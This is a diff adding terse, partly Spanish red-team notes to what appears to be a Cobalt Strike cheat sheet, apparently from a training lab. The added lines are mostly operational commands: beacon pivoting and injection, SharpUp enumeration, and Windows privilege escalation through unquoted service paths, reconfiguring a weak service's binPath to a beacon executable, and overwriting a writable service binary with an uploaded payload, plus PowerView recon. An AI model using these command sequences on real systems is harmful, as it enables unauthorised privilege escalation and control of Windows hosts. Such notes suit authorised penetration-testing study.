@@ -191,11 +191,62 @@ foreach ($Task in $Tasks)
 Attack Windowx Executable(s) Windows DLL
 
 #EscaladePrivilegios
-execute-assembly 
+execute-assembly C:\SharpUp
 
+#Cobal TCP-SMB
+Create a New Listener TCP o SMB - Create beacon.exe TCP o SMB
+netstat -anp tcp
+Pivoting
+jump
+spawn
+spawnas
+inject
+---
+connect localhost 4444
+getuid
+link localhost 
+unlink
 
+#Windows Service
+services.msc
+sc query
+Get-Service | f1
 
+#OPSEC-4
+Restaure la configuración del servicio una vez que haya terminado.
 
+#Unquoted Service Paths
+run wmic service get name, pathname
+powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl
+Los Beacon en escaladas de privilegios mejor por TCP recordar upload 
+run sc qc Vuln-Service-1
+run sc stop Vuln-Service-1
+run sc start Vuln-Service-1
+run netstat -anp tcp
+connect localhost 4444
+
+#Weak Service Permissions
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
+powershell-import C:\Tools\Get-ServiceAcl.ps1 "este"
+powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expand Access
+run sc config Vuln-Service-2 binPath= C:\Temp\beacon-tcp-svc.exe
+run sc qc Vuln-Service-2
+run sc stop Vuln-Service-2
+run sc start Vuln-Service-2
+connect localhost 1337
+
+#Weak Service Binary Permissions
+Los usuarios pueden modificar el servicio3.exe
+powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl
+download Service 3.exe
+upload C:\Payloads\Service 3.exe
+could not upload file: 32
+net helmsg 32
+run sc stop Vuln-Service-3
+upload C:\Payloads\Service 3.exe
+run sc start Vuln-Service-3
+connect localhost 4444
+beacon por TCP si es para escalada de privilegios
 
 #POWERVIEW
 powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
